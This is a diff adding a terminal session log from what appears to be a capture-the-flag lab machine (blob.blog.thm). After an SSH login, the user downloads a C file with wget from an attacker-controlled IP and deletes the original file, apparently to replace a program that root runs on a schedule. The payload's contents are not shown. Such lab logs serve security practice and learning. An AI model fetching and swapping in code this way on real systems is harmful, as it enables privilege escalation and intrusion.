@@ -1,0 +1,59 @@
+Script started on 2025-02-14 23:17:56+03:00 [COMMAND="ssh -i blob_key bobloblaw@blob.blog.thm" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="104" LINES="27"]
+Welcome to Ubuntu 17.04 (GNU/Linux 4.10.0-19-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ * "If you've been waiting for the perfect Kubernetes dev solution for
+   macOS, the wait is over. Learn how to install Microk8s on macOS."
+
+   https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/
+
+0 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to http://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings
+
+Last login: Fri Feb 14 15:17:45 2025 from ip-10-8-61-245.eu-west-1.compute.internal
+]0;bobloblaw@bobloblaw-VirtualBox: ~[01;32mbobloblaw@bobloblaw-VirtualBox[00m:[01;34m~[00m$ You haven't rooted me yet? Jeez
+
+]0;bobloblaw@bobloblaw-VirtualBox: ~[01;32mbobloblaw@bobloblaw-VirtualBox[00m:[01;34m~[00m$ ls
+[0m[01;34mDesktop[0m  [01;34mDocuments[0m  [01;34mDownloads[0m  examples.desktop  [01;34mMusic[0m  [01;34mPictures[0m  [01;34mPublic[0m  [01;34mTemplates[0m  [01;34mVideos[0m
+]0;bobloblaw@bobloblaw-VirtualBox: ~[01;32mbobloblaw@bobloblaw-VirtualBox[00m:[01;34m~[00m$ cd Documents
+]0;bobloblaw@bobloblaw-VirtualBox: ~/Documents[01;32mbobloblaw@bobloblaw-VirtualBox[00m:[01;34m~/Documents[00m$ wget http://10.8.61.245/.boring_file.c
+--2025-02-14 15:18:58--  http://10.8.61.245/.boring_file.c
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 733 [text/x-csrc]
+Saving to: ‘.boring_file.c.1’
+
+.boring_file.c.1            0%[                                      ]       0  --.-KB/s               .boring_file.c.1          100%[=====================================>]     733  --.-KB/s    in 0.001s  
+
+2025-02-14 15:18:59 (1014 KB/s) - ‘.boring_file.c.1’ saved [733/733]
+
+]0;bobloblaw@bobloblaw-VirtualBox: ~/Documents[01;32mbobloblaw@bobloblaw-VirtualBox[00m:[01;34m~/Documents[00m$ You haven't rooted me yet? Jeez
+
+]0;bobloblaw@bobloblaw-VirtualBox: ~/Documents[01;32mbobloblaw@bobloblaw-VirtualBox[00m:[01;34m~/Documents[00m$ ls -al
+total 20
+drwxr-xr-x  3 bobloblaw bobloblaw 4096 Feb 14 15:18 [0m[01;34m.[0m
+drwxrwx--- 16 bobloblaw bobloblaw 4096 Aug  6  2020 [01;34m..[0m
+drwxrwx---  2 bobloblaw bobloblaw 4096 Feb 14 15:19 [01;34m.also_boring[0m
+-rw-rw----  1 bobloblaw bobloblaw   92 Jul 30  2020 .boring_file.c
+-rw-rw-r--  1 bobloblaw bobloblaw  733 Feb 14 15:16 .boring_file.c.1
+]0;bobloblaw@bobloblaw-VirtualBox: ~/Documents[01;32mbobloblaw@bobloblaw-VirtualBox[00m:[01;34m~/Documents[00m$ cat .boring_file.c
+#include <stdio.h>
+int main() {
+	printf("You haven't rooted me yet? Jeez\n");
+	return 0;
+
+}
+]0;bobloblaw@bobloblaw-VirtualBox: ~/Documents[01;32mbobloblaw@bobloblaw-VirtualBox[00m:[01;34m~/Documents[00m$ rm .boring_file.c
+]0;bobloblaw@bobloblaw-VirtualBox: ~/Documents[01;32mbobloblaw@bobloblaw-VirtualBox[00m:[01;34m~/Documents[00m$ mv .boring_file.c.1 .boring_file.c.1 [K[K[K
+]0;bobloblaw@bobloblaw-VirtualBox: ~/Documents[01;32mbobloblaw@bobloblaw-VirtualBox[00m:[01;34m~/Documents[00m$ 
+]0;bobloblaw@bobloblaw-VirtualBox: ~/Documents[01;32mbobloblaw@bobloblaw-VirtualBox[00m:[01;34m~/Documents[00m$ ^C
+]0;bobloblaw@bobloblaw-VirtualBox: ~/Documents[01;32mbobloblaw@bobloblaw-VirtualBox[00m:[01;34m~/Documents[00m$ exit
+logout
+Connection to blob.blog.thm closed.
+
+Script done on 2025-02-14 23:22:09+03:00 [COMMAND_EXIT_CODE="130"]
